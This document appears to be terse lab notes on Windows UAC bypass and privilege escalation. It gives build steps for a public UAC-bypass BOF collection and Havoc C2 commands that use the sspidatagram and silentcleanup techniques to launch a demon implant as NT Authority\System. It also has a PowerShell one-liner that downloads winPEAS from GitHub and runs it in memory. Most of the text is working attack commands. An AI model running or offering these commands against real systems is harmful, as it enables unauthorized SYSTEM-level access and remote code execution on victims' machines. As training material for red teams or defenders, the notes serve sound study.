# UAC - User Account Control (Privilege Escalation)

MITRE Reference

![image](./images/uac_mitre.jpg)

UAC Levels

Screenshot etc...

https://www.youtube.com/watch?v=ZhaZJ4Uipqk

Fodhelper


Demo with cmd.exe -> medium level even if admin
runas 
show whoami / groups
show system informer


start beacon as unprivileged user

whoami groups

```bash
sudo apt install mingw-w64 -y

git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
make
```

In Havoc -> Script Manager Load .py

Set Sleep to 10

```code
uac-bypass sspidatagram c:\windows\system32\cmd.exe
uac-bypass sspidatagram c:\temp\demon.x64.exe -> NT Authority\System
uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -> error
```

---
Priv Esc.

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```
